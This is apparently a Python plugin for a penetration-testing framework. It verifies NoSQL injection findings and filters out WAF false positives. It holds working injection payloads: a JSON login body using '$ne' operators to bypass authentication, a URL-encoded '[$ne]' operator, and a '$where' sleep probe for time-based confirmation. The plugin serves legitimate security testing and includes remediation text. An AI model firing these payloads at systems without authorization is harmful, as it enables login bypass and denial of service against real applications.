"""NoSQL injection verification — WAF false positive filtering."""

from __future__ import annotations

import json
import time
from typing import ClassVar
from urllib.parse import quote

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target


class NosqliVerifyPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="nosqli_verify",
        display_name="NoSQL Injection Verification",
        category=PluginCategory.PENTESTING,
        description="Verifies NoSQL injection findings and filters WAF false positives",
        depends_on=["nosqli_check"],
        produces=["nosqli_verified"],
        timeout=45.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available"
            )

        nosqli_data = ctx.state.get("nosqli_tests", [])
        if not nosqli_data:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("No NoSQL injection findings to verify")],
                data={"verified": []},
            )

        findings: list[Finding] = []
        verified: list[dict] = []
        base_url = ""

        for scheme in ("https", "http"):
            try:
                async with ctx.rate:
                    await ctx.http.head(f"{scheme}://{target.host}/", timeout=5.0)
                    base_url = f"{scheme}://{target.host}"
                    break
            except Exception:
                continue

        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable for verification")],
                data={"verified": []},
            )

        # Deduplicate by page to avoid re-testing same endpoint
        seen_pages: set[str] = set()

        for test in nosqli_data:
            page = test.get("page", "")
            if not page or page in seen_pages:
                continue
            seen_pages.add(page)

            method = test.get("method", "GET")
            label = test.get("label", "")
            url = f"{base_url}{page}"
            entry = {
                "page": page, "label": label, "method": method,
                "verdict": "unknown",
            }

            # Step 1: Baseline — clean request
            baseline_status = -1
            baseline_len = 0
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(f"{url}?q=test", timeout=8.0)
                    body = await resp.text(encoding="utf-8", errors="replace")
                    baseline_status = resp.status
                    baseline_len = len(body)
            except Exception:
                entry["verdict"] = "error"
                verified.append(entry)
                continue

            # Step 2: Innocent parameter — if WAF blocks any params, it's not NoSQL
            innocent_status = -1
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(
                        f"{url}?username=test123abc", timeout=8.0,
                    )
                    innocent_status = resp.status
            except Exception:
                pass

            waf_blocks_all = (
                baseline_status != 403
                and innocent_status == 403
            )

            # Step 3: URL-encoded operator — tests WAF pattern matching
            encoded_status = -1
            try:
                encoded_url = f"{url}?q{quote('[$ne]', safe='')}="
                async with ctx.rate:
                    resp = await ctx.http.get(encoded_url, timeout=8.0)
                    encoded_status = resp.status
            except Exception:
                pass

            # If both raw and encoded get 403, WAF is pattern-matching operators
            waf_pattern_match = (encoded_status == 403 and innocent_status == 403)

            # Step 4: JSON Content-Type test
            json_confirmed = False
            try:
                json_payload = json.dumps({"username": {"$ne": ""}, "password": {"$ne": ""}})
                async with ctx.rate:
                    resp = await ctx.http.post(
                        url,
                        data=json_payload,
                        headers={"Content-Type": "application/json"},
                        timeout=8.0,
                    )
                    json_body = await resp.text(encoding="utf-8", errors="replace")
                    json_status = resp.status
                    json_len = len(json_body)
            except Exception:
                json_status = -1
                json_len = 0

            if json_status != -1 and (
                (
                    json_status != baseline_status
                    and json_status not in (403, 405)
                ) or (
                    json_status == 200
                    and abs(json_len - baseline_len) > max(baseline_len * 0.3, 200)
                )
            ):
                json_confirmed = True

            # Step 5: Time-based probe
            time_confirmed = False
            try:
                time_payload = json.dumps({"$where": "sleep(3000)"})
                async with ctx.rate:
                    t0 = time.monotonic()
                    resp = await ctx.http.post(
                        url,
                        data=time_payload,
                        headers={"Content-Type": "application/json"},
                        timeout=15.0,
                    )
                    elapsed = time.monotonic() - t0
                    if elapsed > 2.5:
                        time_confirmed = True
                        entry["delay"] = round(elapsed, 1)
            except Exception:
                pass

            # Classification
            if json_confirmed or time_confirmed:
                entry["verdict"] = "confirmed"
                conf_method = []
                if json_confirmed:
                    conf_method.append("JSON body injection")
                if time_confirmed:
                    conf_method.append(f"time-based ({entry.get('delay', '?')}s)")

                findings.append(Finding.high(
                    f"NoSQL injection VERIFIED on {page}",
                    description=(
                        f"Confirmed via: {', '.join(conf_method)}. "
                        f"Original detection: {label}."
                    ),
                    evidence=(
                        f"URL: {url}\n"
                        f"JSON confirmed: {json_confirmed}\n"
                        f"Time-based confirmed: {time_confirmed}\n"
                        f"Baseline status: {baseline_status}"
                    ),
                    remediation=(
                        "CONFIRMED NoSQL injection — use parameterized queries, "
                        "sanitize input with ODM libraries, reject object/array parameters."
                    ),
                    tags=["pentesting", "nosqli", "verified"],
                ))
            elif waf_blocks_all or waf_pattern_match:
                entry["verdict"] = "waf_false_positive"
                findings.append(Finding.info(
                    f"NoSQL injection FALSE POSITIVE on {page} [WAF-FP]",
                    description=(
                        f"WAF blocks parameters indiscriminately. "
                        f"Innocent param status: {innocent_status}, "
                        f"encoded operator status: {encoded_status}."
                    ),
                    tags=["pentesting", "nosqli", "false-positive"],
                ))
            else:
                entry["verdict"] = "possible"
                findings.append(Finding.medium(
                    f"NoSQL injection POSSIBLE on {page} (needs manual check)",
                    description=(
                        f"Could not confirm or deny. "
                        f"Baseline: {baseline_status}, innocent: {innocent_status}, "
                        f"JSON: {json_status}. Manual verification recommended."
                    ),
                    tags=["pentesting", "nosqli", "possible"],
                ))

            verified.append(entry)

        if not verified:
            findings.append(Finding.info(
                "No NoSQL injection findings to verify",
                tags=["pentesting", "nosqli"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={"nosqli_verified": verified},
        )
